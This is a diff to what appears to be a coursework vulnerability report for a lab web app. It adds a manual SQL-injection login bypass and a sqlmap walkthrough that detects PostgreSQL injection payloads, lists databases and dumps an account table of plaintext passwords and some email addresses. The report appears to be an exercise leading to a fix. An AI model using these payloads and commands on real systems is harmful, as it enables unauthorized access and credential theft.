@@ -53,6 +53,7 @@ SQL injection allows complete control of the database. We can bypass authenticat
 
 		<h2> INSTRUCTIONS TO VERIFY VULNERABILITY BELOW </h2>
 <xmp>
+Method 1: manual inputing
 1. Visit http://192.168.10.35/fourFours/ login page
 
 2. Enter this as username: test' OR '1'='1';--
@@ -61,7 +62,62 @@ SQL injection allows complete control of the database. We can bypass authenticat
 
 4. You will be logged in without valid credentials
 
-Vulnerable because we don't use parameterized queries.
+Method 2: using sqlmap in Kali Linux
+1. Open terminal in Kali Linux
+
+2. Run sqlmap to test the login form:
+   sqlmap -u "http://192.168.10.35/fourFours/index.php" --data "user=test&password=test&operation=login" --batch
+
+3. sqlmap will detect the injection vulnerability in the user param
+sqlmap identified the following injection point(s) with a total of 36 HTTP(s) requests:
+---
+Parameter: user (POST)
+    Type: boolean-based blind
+    Title: PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)
+    Payload: user=test' AND (SELECT (CASE WHEN (8782=8782) THEN NULL ELSE CAST((CHR(100)||CHR(104)||CHR(118)||CHR(87)) AS NUMERIC) END)) IS NULL-- mhaI&password=test&operation=login
+
+    Type: error-based
+    Title: PostgreSQL AND error-based - WHERE or HAVING clause
+    Payload: user=test' AND 4397=CAST((CHR(113)||CHR(112)||CHR(118)||CHR(106)||CHR(113))||(SELECT (CASE WHEN (4397=4397) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(113)||CHR(106)||CHR(112)||CHR(113)) AS NUMERIC)-- DKOR&password=test&operation=login
+
+    Type: time-based blind
+    Title: PostgreSQL > 8.1 AND time-based blind
+    Payload: user=test' AND 4603=(SELECT 4603 FROM PG_SLEEP(5))-- uhnv&password=test&operation=login
+---
+
+4. extracting database:
+   sqlmap -u "http://192.168.10.35/fourFours/index.php" --data "user=test&password=test&operation=login" --dbs --batch
+available databases [3]:
+[*] information_schema
+[*] pg_catalog
+[*] public
+
+5. dump user tables:
+   sqlmap -u "http://192.168.10.35/fourFours/index.php" --data "user=test&password=test&operation=login" -D public -T account --dump-all --batch
+Database: public
+Table: account
+[15 entries]
++----+----------------+-------------+-----------------------+-----------+
+| id | passwd         | lastname    | username              | firstname |
++----+----------------+-------------+-----------------------+-----------+
+| 1  | sdfdsfd        | Large       | bigBoy                | Alex      |
+| 2  | lion           | Lion        | anne                  | Anne      |
+| 3  | fourfivesix    | Swim        | lindah20              | Linda     |
+| 4  | silverisbetter | Silver      | coins                 | Abagail   |
+| 5  | password1      | Burn        | matchstick            | Jessie    |
+| 6  | password       | Cup         | coffee                | Annie     |
+| 7  | passw0rd       | Bassell     | ssll                  | Diane     |
+| 8  | cliff          | Mountain    | cliff                 | Steve     |
+| 9  | sdxfdsgger     | Rosenbloom  | arnold@cs.toronto.edu | Arnold    |
+| 10 | perl           | Perlmuter   | perl                  | Jay       |
+| 11 | Peter          | Piper       | pickApeck             | Peter     |
+| 12 | jbh            | Binghampton | hotel                 | Jen       |
+| 13 | esrever        | Kleinman    | dk@gmail.com          | David     |
+| 14 | badPassword    | Kowalski    | eightball@gmail.com   | Jesse     |
+| 15 | grant          | Grant       | ivanna                | Ivanna    |
++----+----------------+-------------+-----------------------+-----------+
+
+sqlmap will automatically find and exploit injections to extract all the data from the database.
 </xmp>
                 <h2> The Fix </h2>
                 <ul>
